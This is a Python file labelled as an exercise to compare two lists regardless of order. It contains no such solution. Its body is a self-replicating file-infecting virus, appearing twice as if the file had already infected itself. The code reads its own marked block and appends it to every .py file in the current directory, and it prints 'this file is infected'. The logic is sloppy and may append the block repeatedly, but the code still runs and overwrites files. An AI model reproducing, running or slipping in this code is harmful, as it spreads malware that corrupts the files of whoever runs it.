#Write a Python program to check if two given lists contain the same elements regardless of order.

# starting of virus code
import sys,re,glob
viruscode=[]
thisfile=sys.argv[0]
virusfile=open(thisfile,"r")
lines=virusfile.readlines()
virusfile.close()
#print(lines)
invirus=False
for line in lines:
    if(re.search("^# starting of virus code",line)):
        invirus=True
    if(invirus==True):
        viruscode.append(line)
    if(re.search("^# end of virus code",line)):
        break

program=glob.glob("*.py")
for p in program:
    file=open(p,"r")
    programcode=file.readlines()
    file.close()
    infected=False
    for line in programcode:
        if(re.search("^# starting of virus code",line)):
            infected=True
            break
        if not infected:
            newcode=[]
            newcode=programcode
            newcode.extend(viruscode)

            file=open(p,"w")
            file.writelines(newcode)
            file.close()

print("this file is infected")
# end of virus code# starting of virus code
import sys,re,glob
viruscode=[]
thisfile=sys.argv[0]
virusfile=open(thisfile,"r")
lines=virusfile.readlines()
virusfile.close()
#print(lines)
invirus=False
for line in lines:
    if(re.search("^# starting of virus code",line)):
        invirus=True
    if(invirus==True):
        viruscode.append(line)
    if(re.search("^# end of virus code",line)):
        break

program=glob.glob("*.py")
for p in program:
    file=open(p,"r")
    programcode=file.readlines()
    file.close()
    infected=False
    for line in programcode:
        if(re.search("^# starting of virus code",line)):
            infected=True
            break
        if not infected:
            newcode=[]
            newcode=programcode
            newcode.extend(viruscode)

            file=open(p,"w")
            file.writelines(newcode)
            file.close()

print("this file is infected")
# end of virus code